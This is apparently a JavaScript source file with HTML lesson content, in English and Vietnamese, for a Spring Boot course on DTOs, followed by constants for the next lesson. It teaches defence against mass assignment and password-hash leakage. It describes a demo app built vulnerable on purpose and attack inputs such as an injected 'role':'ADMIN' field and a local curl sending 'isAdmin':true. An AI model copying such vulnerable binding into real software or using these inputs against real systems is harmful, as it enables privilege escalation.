<p><strong>How to prevent it:</strong> never bind requests to entities; one request DTO per use case with only the editable fields; fields like <code>role</code>, <code>id</code>, <code>status</code>, <code>ownerId</code> come from the server (the logged-in user, a state machine), never from the body; a test that sends the forbidden field and asserts it was ignored (Lab 4 item 3); in Chapter 10 we attack this again with JPA, where <code>save(entity)</code> makes it worse.</p></div>

<h3>Bug 4 — your database schema becomes your API</h3>
<p>With the entity in the response, the JSON keys <em>are</em> the Java property names. Rename <code>fullName</code> to <code>name</code> during a refactor and every mobile app in the field breaks — silently, because both sides still compile. Add a relation and the response grows; with JPA lazy loading (Chapter 7) serialising an entity can even fire extra SQL queries or throw <code>LazyInitializationException</code> after the transaction closed. A DTO is a contract: the entity can change freely behind it, and the mapping code is the one place the compiler forces you to update.</p>

<h3>The fix: record DTOs</h3>
${MA42_DTOS}
${MA42_GOOD}
${OUT42_GOOD}
<ul>
  <li><code>StudentResponse</code> contains exactly what the client should see, plus a computed field (<code>bookingCount</code>) that does not exist in the table. No relation, so no loop; no hash, so no leak.</li>
  <li><code>UpdateProfileRequest</code> has one field. The attacker's <code>"role":"ADMIN"</code> is simply <strong>ignored</strong>: Spring Boot configures Jackson with <code>FAIL_ON_UNKNOWN_PROPERTIES = false</code>.</li>
  <li>Records (lesson 1.1) are ideal: immutable, <code>equals</code>/<code>toString</code> for free, and Jackson 3 reads them through the canonical constructor.</li>
</ul>
<p>Want the attacker's request rejected instead of ignored? Turn unknown properties into an error:</p>
${OUT42_STRICT}
<p>Strict mode is good for internal APIs and for catching client typos (<code>"fulName"</code>), but it breaks <em>forward compatibility</em>: an older server rejects a newer client that sends an extra field. Most public APIs keep the lenient default and rely on the DTO to drop unknown fields.</p>

<h3>Mapping: by hand or MapStruct</h3>
<p><code>StudentResponse.from(student)</code> above is mapping by hand: explicit, debuggable, no library. With 30 DTOs and 15 fields each it becomes repetitive, and <strong>MapStruct</strong> generates that code at compile time:</p>
${MA42_MAPPER}
${OUT42_MSWARN}
${MA42_IMPL}
<p>Look at the generated code: <code>bookingCount</code> is set to <code>0</code>, because <code>Student</code> has no property called <code>bookingCount</code>. The build said <strong>SUCCESS</strong>, the only signal was a WARNING line, and <code>/v2/me-mapstruct</code> above happily answered <code>"bookingCount":0</code> for a student with one booking. A wrong number in an API is worse than an exception. Configure MapStruct to fail the build on unmapped target properties — that is the practice exercise below.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">By hand</span><span class="v">Zero magic, best for few DTOs or complex logic. Risk: forgetting a field (tests catch it).</span></div>
  <div class="kv"><span class="k">MapStruct</span><span class="v">Generated at compile time: plain Java, as fast as hand-written, readable in <code>target/generated-sources</code>. Risk: silent defaults unless <code>unmappedTargetPolicy = ERROR</code>.</span></div>
  <div class="kv"><span class="k">ModelMapper and friends</span><span class="v">Reflection at runtime, guesses by name, errors appear only when the code runs. Avoid for new projects.</span></div>
</div>
<p>Where to map? A good default: the controller speaks DTOs, the service speaks domain objects/entities, and the mapping happens at the edge — but with JPA it must happen <strong>inside</strong> the transaction (Chapter 7 shows why).</p>

<h3>Compared with Node.js</h3>
${MA42_NODE}
${OUT42_NODE}
<p>The same two bugs, in fewer lines: <code>res.json(an)</code> sends everything, and <code>Object.assign(an, req.body)</code> is mass assignment in one call. The fix is the same idea: pick fields explicitly (destructuring here; zod schemas or Prisma's <code>select</code>/<code>omit</code> in the Node.js course). In interviews: "DTOs are not a Java ceremony — they are the API contract; in Node you write the same thing as a schema."</p>

<h3>In real life and at work</h3>
<ul>
  <li><strong>Code review red flags:</strong> a controller method that returns or accepts a class annotated <code>@Entity</code>; <code>BeanUtils.copyProperties(request, entity)</code>; a <code>@JsonIgnore</code> on a password field (it means the entity is being serialised somewhere).</li>
  <li><strong>SWP391:</strong> the front-end team asks for "one more field" every week. With DTOs you add it to the response record without touching the table; without DTOs you are tempted to add a column.</li>
  <li><strong>Different views of the same thing:</strong> a student sees <code>DeviceResponse</code>; the lab manager sees <code>DeviceAdminResponse</code> with the purchase price. Two DTOs, one entity — that is exactly Lab 4.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"Why use DTOs instead of returning entities?"</strong> — Control what is exposed (no hashes, internal fields), what can be written (mass assignment), avoid serialisation problems (cycles, lazy loading), and keep the API contract stable when the schema changes.</li>
  <li><strong>"What is mass assignment and how do you prevent it in Spring?"</strong> — Binding a request body to an object with more fields than the client may set. Prevent with request DTOs that contain only editable fields; server-controlled fields come from the server.</li>
  <li><strong>"How do you fix infinite recursion with bidirectional relations?"</strong> — The real fix is a DTO without the back-reference. <code>@JsonIgnore</code>/<code>@JsonManagedReference</code> stop the loop but keep exposing the entity.</li>
  <li><strong>"MapStruct vs ModelMapper?"</strong> — Compile-time generated code vs runtime reflection; MapStruct is faster and fails early if configured with <code>unmappedTargetPolicy = ERROR</code>.</li>
  <li><strong>"Should FAIL_ON_UNKNOWN_PROPERTIES be true?"</strong> — Trade-off: strictness catches typos and abuse, leniency keeps old servers compatible with newer clients. With DTOs, lenient is safe because unknown fields have nowhere to go.</li>
</ol>

<h3>🧪 Practice (20 minutes)</h3>
<div class="callout ok"><ol>
  <li>Make the MapStruct mapper fill <code>bookingCount</code> correctly.</li>
  <li>Make the build <strong>fail</strong> whenever a target property is left unmapped, so this bug cannot come back silently.</li>
</ol>
<p><strong>Done when:</strong> removing your fix from (1) gives BUILD FAILURE, and with the fix <code>/v2/me-mapstruct</code> returns the same <code>bookingCount</code> as <code>/v2/me</code>.</p></div>
${giai('Show one solution', `${MA42_FIXED}
${OUT42_MSERR}
${OUT42_FIXED}
<p><code>unmappedTargetPolicy = ReportingPolicy.ERROR</code> turns the warning into a compile error (you can also set it once for the whole project with the compiler argument <code>-Amapstruct.unmappedTargetPolicy=ERROR</code>); the <code>@Mapping</code> with a Java expression fills the computed field.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Entity</span><span class="v">Object shaped like a database row; internal to the server.</span></div>
  <div class="kv"><span class="k">DTO</span><span class="v">Data Transfer Object: the shape of one API request or response — the contract.</span></div>
  <div class="kv"><span class="k">Mass assignment</span><span class="v">Binding client input to fields the client must not control (role, id, owner…).</span></div>
  <div class="kv"><span class="k">Excessive data exposure</span><span class="v">Returning more fields than the client needs; with mass assignment, OWASP API3:2023.</span></div>
  <div class="kv"><span class="k">MapStruct</span><span class="v">Annotation processor that generates mapping code at compile time.</span></div>
  <div class="kv"><span class="k">FAIL_ON_UNKNOWN_PROPERTIES</span><span class="v">Jackson option: reject JSON fields the target class does not have (off in Spring Boot).</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Returning entities caused a 200 response with silently truncated data, and the popular fix leaked the password hash.</li>
  <li>Accepting entities let one extra JSON field turn a student into an admin — the GitHub 2012 class of bug.</li>
  <li>Record DTOs per use case fix all of it; unknown fields are dropped, or rejected in strict mode.</li>
  <li>MapStruct removes boilerplate, but make unmapped targets a build error.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', '🛡️', 'OWASP API3:2023 — Broken Object Property Level Authorization', 'Excessive data exposure and mass assignment, with attack scenarios.')}
${tl('https://mapstruct.org/documentation/stable/reference/html/', '🗺️', 'MapStruct reference guide', 'Configuration, expressions, unmappedTargetPolicy, Spring component model.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: DtoApp on Spring Boot 4.1.2 with Jackson 3.1.7 and MapStruct 1.6.3, Temurin 21.0.12.1; Express 5.3.0 on Node 22.22.2 (19/11/2026). The bcrypt hash is a real hash of the demo password <code>an-lab-2026</code>, generated with Spring Security's <code>BCryptPasswordEncoder(10)</code>.</li>
  <li>GitHub, "Public Key Security Vulnerability and Mitigation" (04/03/2012): <a href="https://github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation/" target="_blank" rel="noopener">github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation</a></li>
  <li>OWASP API Security Top 10 2023, API3.</li>
</ul>
</div>
`;

const L42_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.2</span>
<h2>DTO: vì sao không trả thẳng entity</h2>
<p class="lead">Controller ngắn nhất là controller trả về đúng đối tượng vừa đọc từ cơ sở dữ liệu và nhận vào cũng chính class đó. Nó biên dịch được, chạy ngon ở buổi demo đầu tiên, và mang theo bốn lỗi sẽ lộ ra sau này: một response lặp mãi tới khi Jackson bỏ cuộc, một hash mật khẩu nằm trong JSON, một sinh viên tự phong admin bằng một trường thừa, và một API thay đổi mỗi khi ai đó đổi tên cột. Ta tái hiện cả bốn trên Spring Boot 4.1.2, rồi sửa bằng các DTO (Data Transfer Object — đối tượng chuyển dữ liệu) nhỏ viết bằng <code>record</code>, ánh xạ bằng tay và bằng MapStruct — kể cả một lỗi MapStruct mà chỉ một dòng cảnh báo của trình biên dịch nói cho bạn biết.</p>

<h3>Đời thường trước đã</h3>
<p>Công ty giữ một bộ hồ sơ nhân sự cho mỗi nhân viên: lương, số căn cước, địa chỉ nhà, nhận xét đánh giá. Thứ nhân viên đeo ở cửa là <strong>thẻ nhân viên</strong>: tên, ảnh, phòng ban. Không ai đưa bộ hồ sơ cho bảo vệ — và cũng không ai để nhân viên tự điền vào hồ sơ nhân sự của mình. <strong>Entity</strong> là bộ hồ sơ (có hình dạng của hàng trong cơ sở dữ liệu); <strong>DTO</strong> là tấm thẻ (có hình dạng của thứ mà riêng lời gọi API này cần). <em>DTO response</em> quyết định cái gì đi ra; <em>DTO request</em> quyết định client được phép gửi vào cái gì.</p>

<h3>"Entity"</h3>
<p>Chương 6 mới gắn <code>@Entity</code>; hình dạng thì đã giống thật: một hash mật khẩu, một vai trò, một bộ đếm đăng nhập sai, và một quan hệ hai chiều (sinh viên có các lượt đặt, lượt đặt trỏ ngược về sinh viên — cực kỳ hay gặp với JPA).</p>
${MA42_STUDENT}
${MA42_BOOKING}
${MA42_BAD}

<h3>Lỗi 1 — một response không có hồi kết</h3>
${OUT42_REC}
${OUT42_RECLOG}
<p>Student ⇒ bookings ⇒ booking ⇒ student ⇒ bookings… Jackson 3 dừng ở giới hạn lồng mặc định 500 tầng — nhưng nó đã bắt đầu ghi, dòng trạng thái <code>200</code> đã được gửi đi, và "response committed already" nghĩa là Spring không đổi được nữa. Client nhận 8&nbsp;813 byte <strong>JSON hợp lệ</strong>, sâu 166 tầng, mà sinh viên ở tầng trong cùng không có cả email. Phía client không có lỗi nào. (Các bản Jackson 2 cũ thì hỏng theo kiểu khác, với dòng nổi tiếng "Infinite recursion (StackOverflowError)".)</p>

<h3>Lỗi 2 — cách sửa trên StackOverflow làm lộ hash</h3>
<p>Các câu trả lời nhiều phiếu nhất cho "Jackson infinite recursion" đều nói: đặt <code>@JsonIgnore</code> (hoặc <code>@JsonBackReference</code>) lên tham chiếu ngược.</p>
${MA42_IGNORE}
${OUT42_LEAK}
<p>Hết vòng lặp — và response giờ chứa <code>passwordHash</code>, <code>failedLogins</code> và <code>role</code>. Hash bcrypt không phải mật khẩu, nhưng có thể bị bẻ ngoại tuyến hết tốc lực GPU; bộ đếm đăng nhập sai cho kẻ tấn công biết tài khoản còn cách bị khoá bao xa. Bạn có thể cứ thêm <code>@JsonIgnore</code> lên từng trường nhạy cảm, nhưng đó là danh sách cấm trên một class sẽ còn lớn thêm: lập trình viên sau thêm <code>nationalId</code> và quên annotation. Để ý thêm: Jackson 3 mặc định ghi thuộc tính JavaBean <strong>theo thứ tự chữ cái</strong> (<code>SORT_PROPERTIES_ALPHABETICALLY</code> đang bật, bài 4.3).</p>

<h3>Lỗi 3 — mass assignment (gán hàng loạt)</h3>
${OUT42_MASS}
<p>Biểu mẫu hồ sơ chỉ hiện ô "họ tên", nhưng endpoint nhận một <code>Student</code>, nên Jackson gọi <strong>mọi setter mà JSON nhắc tới</strong>: <code>setRole("ADMIN")</code>, <code>setPasswordHash(…)</code>. Kẻ tấn công giờ có quyền admin, và một hash mật khẩu do chính hắn tạo — nghĩa là hắn biết luôn mật khẩu. Đây là <strong>mass assignment</strong>; OWASP API Security Top 10 (2023) gộp nó với lộ dữ liệu thừa thành <strong>API3: Broken Object Property Level Authorization</strong> (phân quyền cấp thuộc tính bị hỏng).</p>
<div class="callout warn"><p><strong>🕵️ Sự cố thật — GitHub, 4/3/2012.</strong> Biểu mẫu cập nhật khoá công khai của GitHub có lỗi mass assignment — theo đúng lời bài viết của GitHub, "a failure to properly check incoming form parameters" (không kiểm tham số biểu mẫu gửi lên). Một người dùng đã dùng nó để gắn khoá công khai của mình vào tổ chức <code>rails</code> và đẩy một tệp lên kho mã Ruby on Rails để chứng minh, lúc 8 giờ 49 sáng giờ Thái Bình Dương. GitHub gỡ khoá, khoá tài khoản người đó, phát hành bản sửa lúc 9 giờ 53, rà toàn bộ mã tìm chỗ tương tự và đăng bài phân tích ngay trong ngày. Framework (Rails) khi đó mặc định cho phép điều này; cách sửa cùng một ý với DTO request — một danh sách tường minh các trường client được đặt.</p>
<p><strong>Cách phòng:</strong> không bao giờ gắn request vào entity; mỗi tình huống một DTO request chỉ chứa trường được sửa; các trường như <code>role</code>, <code>id</code>, <code>status</code>, <code>ownerId</code> do server quyết (người đang đăng nhập, máy trạng thái), không bao giờ lấy từ body; một test gửi trường bị cấm và kiểm là nó bị bỏ qua (mục 3 của Lab 4); Chương 10 tấn công lại lỗi này với JPA, nơi <code>save(entity)</code> làm nó tệ hơn.</p></div>

<h3>Lỗi 4 — lược đồ cơ sở dữ liệu thành API của bạn</h3>
<p>Khi trả entity, khoá JSON <em>chính là</em> tên thuộc tính Java. Đổi <code>fullName</code> thành <code>name</code> lúc tái cấu trúc là mọi ứng dụng di động đang chạy ngoài kia hỏng — một cách im lặng, vì cả hai bên vẫn biên dịch được. Thêm một quan hệ là response phình ra; với lazy loading của JPA (Chương 7), tuần tự hoá một entity còn có thể bắn thêm câu SQL hoặc ném <code>LazyInitializationException</code> sau khi giao dịch đã đóng. DTO là một hợp đồng: entity đằng sau thay đổi thoải mái, và mã ánh xạ là chỗ duy nhất trình biên dịch buộc bạn sửa theo.</p>

<h3>Cách sửa: DTO bằng record</h3>
${MA42_DTOS}
${MA42_GOOD}
${OUT42_GOOD}
<ul>
  <li><code>StudentResponse</code> chứa đúng thứ client nên thấy, cộng một trường tính ra (<code>bookingCount</code>) không có trong bảng. Không có quan hệ nên không có vòng lặp; không có hash nên không lộ.</li>
  <li><code>UpdateProfileRequest</code> có một trường. <code>"role":"ADMIN"</code> của kẻ tấn công đơn giản là <strong>bị bỏ qua</strong>: Spring Boot cấu hình Jackson với <code>FAIL_ON_UNKNOWN_PROPERTIES = false</code>.</li>
  <li>Record (bài 1.1) rất hợp: bất biến, có sẵn <code>equals</code>/<code>toString</code>, và Jackson 3 đọc chúng qua constructor chuẩn.</li>
</ul>
<p>Muốn request của kẻ tấn công bị từ chối thay vì bị bỏ qua? Biến trường lạ thành lỗi:</p>
${OUT42_STRICT}
<p>Chế độ nghiêm hợp với API nội bộ và để bắt lỗi gõ sai của client (<code>"fulName"</code>), nhưng nó phá <em>tương thích về sau</em>: server cũ từ chối client mới gửi thêm một trường. Phần lớn API công khai giữ mặc định dễ dãi và để DTO tự bỏ trường lạ.</p>

<h3>Ánh xạ: bằng tay hay MapStruct</h3>
<p><code>StudentResponse.from(student)</code> ở trên là ánh xạ bằng tay: tường minh, dễ debug, không cần thư viện. Với 30 DTO, mỗi cái 15 trường, nó thành lặp lại, và <strong>MapStruct</strong> sinh đoạn mã đó lúc biên dịch:</p>
${MA42_MAPPER}
${OUT42_MSWARN}
${MA42_IMPL}
<p>Nhìn mã được sinh ra: <code>bookingCount</code> bị đặt bằng <code>0</code>, vì <code>Student</code> không có thuộc tính nào tên <code>bookingCount</code>. Build báo <strong>SUCCESS</strong>, tín hiệu duy nhất là một dòng WARNING, và <code>/v2/me-mapstruct</code> ở trên vui vẻ trả <code>"bookingCount":0</code> cho một sinh viên có một lượt đặt. Một con số sai trong API còn tệ hơn một exception. Hãy cấu hình MapStruct để build hỏng khi có thuộc tính đích chưa ánh xạ — đó là bài thực hành bên dưới.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Bằng tay</span><span class="v">Không có phép màu, tốt nhất khi ít DTO hoặc logic phức tạp. Rủi ro: quên một trường (test sẽ bắt).</span></div>
  <div class="kv"><span class="k">MapStruct</span><span class="v">Sinh lúc biên dịch: Java thuần, nhanh như viết tay, đọc được trong <code>target/generated-sources</code>. Rủi ro: giá trị mặc định im lặng nếu không đặt <code>unmappedTargetPolicy = ERROR</code>.</span></div>
  <div class="kv"><span class="k">ModelMapper và các thư viện tương tự</span><span class="v">Reflection lúc chạy, đoán theo tên, lỗi chỉ lộ khi mã chạy. Tránh cho dự án mới.</span></div>
</div>
<p>Ánh xạ ở đâu? Mặc định tốt: controller nói chuyện bằng DTO, service làm việc với đối tượng miền/entity, việc ánh xạ diễn ra ở rìa — nhưng với JPA nó phải diễn ra <strong>bên trong</strong> giao dịch (Chương 7 cho thấy vì sao).</p>

<h3>So với Node.js</h3>
${MA42_NODE}
${OUT42_NODE}
<p>Đúng hai lỗi đó, ít dòng hơn: <code>res.json(an)</code> gửi tất cả, còn <code>Object.assign(an, req.body)</code> là mass assignment trong một lời gọi. Cách sửa cùng một ý: chọn trường tường minh (ở đây bằng destructuring; khoá Node.js dùng schema zod hoặc <code>select</code>/<code>omit</code> của Prisma). Khi phỏng vấn: "DTO không phải nghi thức rườm rà của Java — nó là hợp đồng API; trong Node bạn viết đúng thứ đó dưới dạng một schema."</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li><strong>Cờ đỏ khi review mã:</strong> một hàm controller trả về hoặc nhận vào một class có <code>@Entity</code>; <code>BeanUtils.copyProperties(request, entity)</code>; một <code>@JsonIgnore</code> trên trường mật khẩu (nghĩa là entity đang bị tuần tự hoá ở đâu đó).</li>
  <li><strong>SWP391:</strong> nhóm frontend tuần nào cũng xin "thêm một trường nữa". Có DTO thì bạn thêm vào record response mà không đụng bảng; không có DTO thì bạn bị cám dỗ thêm cột.</li>
  <li><strong>Nhiều góc nhìn của cùng một thứ:</strong> sinh viên thấy <code>DeviceResponse</code>; quản lý lab thấy <code>DeviceAdminResponse</code> có giá mua. Hai DTO, một entity — đúng như Lab 4.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Vì sao dùng DTO thay vì trả entity?"</strong> — Kiểm soát cái gì lộ ra (không hash, không trường nội bộ), cái gì được ghi (mass assignment), tránh rắc rối tuần tự hoá (vòng lặp, lazy loading), và giữ hợp đồng API ổn định khi lược đồ đổi.</li>
  <li><strong>"Mass assignment là gì và chặn trong Spring thế nào?"</strong> — Gắn body request vào một đối tượng có nhiều trường hơn mức client được đặt. Chặn bằng DTO request chỉ chứa trường được sửa; trường do server quản lý thì server tự đặt.</li>
  <li><strong>"Sửa infinite recursion với quan hệ hai chiều thế nào?"</strong> — Cách sửa thật là một DTO không có tham chiếu ngược. <code>@JsonIgnore</code>/<code>@JsonManagedReference</code> dừng được vòng lặp nhưng vẫn để lộ entity.</li>
  <li><strong>"MapStruct khác ModelMapper?"</strong> — Mã sinh lúc biên dịch so với reflection lúc chạy; MapStruct nhanh hơn và hỏng sớm nếu cấu hình <code>unmappedTargetPolicy = ERROR</code>.</li>
  <li><strong>"FAIL_ON_UNKNOWN_PROPERTIES có nên bật không?"</strong> — Đánh đổi: nghiêm thì bắt được lỗi gõ và lạm dụng, dễ dãi thì server cũ vẫn hợp với client mới. Có DTO thì dễ dãi vẫn an toàn vì trường lạ không có chỗ nào để rơi vào.</li>
</ol>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><ol>
  <li>Làm cho mapper MapStruct điền <code>bookingCount</code> đúng.</li>
  <li>Làm cho build <strong>hỏng</strong> mỗi khi có thuộc tính đích chưa được ánh xạ, để lỗi này không quay lại một cách im lặng.</li>
</ol>
<p><strong>Đạt khi:</strong> gỡ phần sửa ở (1) thì build báo BUILD FAILURE, còn có phần sửa thì <code>/v2/me-mapstruct</code> trả cùng <code>bookingCount</code> với <code>/v2/me</code>.</p></div>
${giai('Xem một lời giải', `${MA42_FIXED}
${OUT42_MSERR}
${OUT42_FIXED}
<p><code>unmappedTargetPolicy = ReportingPolicy.ERROR</code> biến cảnh báo thành lỗi biên dịch (cũng có thể đặt một lần cho cả dự án bằng đối số trình biên dịch <code>-Amapstruct.unmappedTargetPolicy=ERROR</code>); <code>@Mapping</code> với một biểu thức Java điền trường tính ra.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Entity</span><span class="v">Đối tượng có hình dạng một hàng trong cơ sở dữ liệu; nội bộ của server.</span></div>
  <div class="kv"><span class="k">DTO</span><span class="v">Data Transfer Object: hình dạng của một request hoặc response API — chính là hợp đồng.</span></div>
  <div class="kv"><span class="k">Mass assignment</span><span class="v">Gắn dữ liệu client gửi vào những trường client không được quyền điều khiển (vai trò, id, chủ sở hữu…).</span></div>
  <div class="kv"><span class="k">Lộ dữ liệu thừa</span><span class="v">Trả nhiều trường hơn mức client cần; cùng với mass assignment là OWASP API3:2023.</span></div>
  <div class="kv"><span class="k">MapStruct</span><span class="v">Annotation processor sinh mã ánh xạ lúc biên dịch.</span></div>
  <div class="kv"><span class="k">FAIL_ON_UNKNOWN_PROPERTIES</span><span class="v">Tuỳ chọn Jackson: từ chối trường JSON mà class đích không có (Spring Boot tắt sẵn).</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Trả entity gây ra một response 200 với dữ liệu bị cắt im lặng, và cách sửa phổ biến lại làm lộ hash mật khẩu.</li>
  <li>Nhận entity cho phép một trường JSON thừa biến sinh viên thành admin — đúng loại lỗi của GitHub năm 2012.</li>
  <li>DTO bằng record cho từng tình huống sửa được tất cả; trường lạ bị bỏ, hoặc bị từ chối ở chế độ nghiêm.</li>
  <li>MapStruct bớt mã lặp, nhưng hãy biến thuộc tính đích chưa ánh xạ thành lỗi build.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', '🛡️', 'OWASP API3:2023 — Broken Object Property Level Authorization', 'Lộ dữ liệu thừa và mass assignment, kèm các kịch bản tấn công.')}
${tl('https://mapstruct.org/documentation/stable/reference/html/', '🗺️', 'Tài liệu MapStruct', 'Cấu hình, biểu thức, unmappedTargetPolicy, mô hình component Spring.')}

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: DtoApp trên Spring Boot 4.1.2 với Jackson 3.1.7 và MapStruct 1.6.3, Temurin 21.0.12.1; Express 5.3.0 trên Node 22.22.2 (19/11/2026). Hash bcrypt là hash thật của mật khẩu demo <code>an-lab-2026</code>, tạo bằng <code>BCryptPasswordEncoder(10)</code> của Spring Security.</li>
  <li>GitHub, "Public Key Security Vulnerability and Mitigation" (04/03/2012): <a href="https://github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation/" target="_blank" rel="noopener">github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation</a></li>
  <li>OWASP API Security Top 10 2023, API3.</li>
</ul>
</div>
`;

// ===== Bài 4.3 =====
const MA43_CTRL = java("@RestController\npublic class BookingController {\n\n    public record BookingRequest(String labCode, int seats, LocalDateTime startAt, Instant endAt) {}\n\n    public record BookingView(String labCode, int seats, LocalDateTime startAt, Instant endAt, String serverSees) {}\n\n    @PostMapping(value = \"/bookings\", consumes = MediaType.APPLICATION_JSON_VALUE)\n    public BookingView create(@RequestBody BookingRequest req) {\n        // in ra đúng cái Java nhận được sau khi Jackson đọc JSON\n        return new BookingView(req.labCode(), req.seats(), req.startAt(), req.endAt(), req.toString());\n    }");
const MA43_TIMES = java("    public record Times(Instant instant, LocalDateTime localDateTime, OffsetDateTime offsetDateTime,\n                        ZonedDateTime zonedDateTime, LocalDate localDate, Duration duration, Date legacyDate) {}\n\n    private static final Instant T = Instant.parse(\"2026-11-20T01:00:00Z\");   // 08:00 giờ Việt Nam\n\n    @GetMapping(\"/times\")\n    public Times times() {\n        ZoneId zone = ZoneId.systemDefault();\n        return new Times(T, LocalDateTime.ofInstant(T, zone), OffsetDateTime.ofInstant(T, zone),\n                T.atZone(zone), LocalDate.ofInstant(T, zone), Duration.ofMinutes(90), Date.from(T));\n    }");
const OUT43_OK = out("$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2,\"startAt\":\"2026-11-20T08:00:00\",\"endAt\":\"2026-11-20T03:00:00Z\"}'\n{\"labCode\":\"AI-01\",\"seats\":2,\"startAt\":\"2026-11-20T08:00:00\",\"endAt\":\"2026-11-20T03:00:00Z\",\"serverSees\":\"BookingRequest[labCode=AI-01, seats=2, startAt=2026-11-20T08:00, endAt=2026-11-20T03:00:00Z]\"}");
const OUT43_LOI = out("$ curl -i -X POST localhost:8080/bookings -H 'Content-Type: text/plain' -d AI-01\nHTTP/1.1 415 \nAccept: application/json\nContent-Type: application/json\n\n{\"timestamp\":\"2026-11-18T17:45:05.361Z\",\"status\":415,\"error\":\"Unsupported Media Type\",\"path\":\"/bookings\"}\n$ curl -i -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2'\nHTTP/1.1 400 \nContent-Type: application/json\n\n{\"timestamp\":\"2026-11-18T17:45:05.368Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/bookings\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":\"hai\"}'\n{\"timestamp\":\"2026-11-18T17:45:05.377Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/bookings\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\"}'\n{\"timestamp\":\"2026-11-18T17:45:05.385Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/bookings\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2,\"isAdmin\":true}'\n{\"labCode\":\"AI-01\",\"seats\":2,\"startAt\":null,\"endAt\":null,\"serverSees\":\"BookingRequest[labCode=AI-01, seats=2, startAt=null, endAt=null]\"}");
const OUT43_LOG = out("# log của server cho các request trên và bên dưới\nWARN … HttpMediaTypeNotSupportedException: Content-Type 'text/plain' is not supported\nWARN … HttpMessageNotReadableException: JSON parse error: Unexpected end-of-input: expected close marker for Object\nWARN … HttpMessageNotReadableException: JSON parse error: Cannot deserialize value of type `int` from String \"hai\": not a valid `int` value\nWARN … HttpMessageNotReadableException: JSON parse error: Cannot map `null` into type `int`\nWARN … HttpMessageNotReadableException: JSON parse error: Cannot deserialize value of type `java.time.LocalDateTime` from String \"2026-11-20T08:00:00+07:00\"\nWARN … HttpMessageNotReadableException: JSON parse error: Cannot deserialize value of type `java.time.Instant` from String \"2026-11-20T08:00:00\"\nWARN … HttpMediaTypeNotAcceptableException: No acceptable representation");
const MA43_INFO = java("import org.springframework.boot.ApplicationRunner;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport tools.jackson.databind.DeserializationFeature;\nimport tools.jackson.databind.MapperFeature;\nimport tools.jackson.databind.SerializationFeature;\nimport tools.jackson.databind.json.JsonMapper;\nimport tools.jackson.databind.cfg.DateTimeFeature;\n\n@Configuration\npublic class JacksonInfo {\n\n    @Bean\n    ApplicationRunner printJackson(JsonMapper mapper) {           // Boot 4 tạo sẵn bean JsonMapper (Jackson 3)\n        return args -> {\n            System.out.println(\"mapper class                = \" + mapper.getClass().getName());\n            System.out.println(\"FAIL_ON_UNKNOWN_PROPERTIES  = \" + mapper.isEnabled(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES));\n            System.out.println(\"FAIL_ON_NULL_FOR_PRIMITIVES = \" + mapper.isEnabled(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES));\n            System.out.println(\"SORT_PROPERTIES_ALPHABETICALLY = \" + mapper.isEnabled(MapperFeature.SORT_PROPERTIES_ALPHABETICALLY));\n            System.out.println(\"WRITE_DATES_AS_TIMESTAMPS   = \" + mapper.isEnabled(DateTimeFeature.WRITE_DATES_AS_TIMESTAMPS));\n            System.out.println(\"INDENT_OUTPUT               = \" + mapper.isEnabled(SerializationFeature.INDENT_OUTPUT));\n        };\n    }\n}");
const OUT43_DEF = out("$ java … JsonApp\nmapper class                = tools.jackson.databind.json.JsonMapper\nFAIL_ON_UNKNOWN_PROPERTIES  = false\nFAIL_ON_NULL_FOR_PRIMITIVES = true\nSORT_PROPERTIES_ALPHABETICALLY = true\nWRITE_DATES_AS_TIMESTAMPS   = false\nINDENT_OUTPUT               = false");
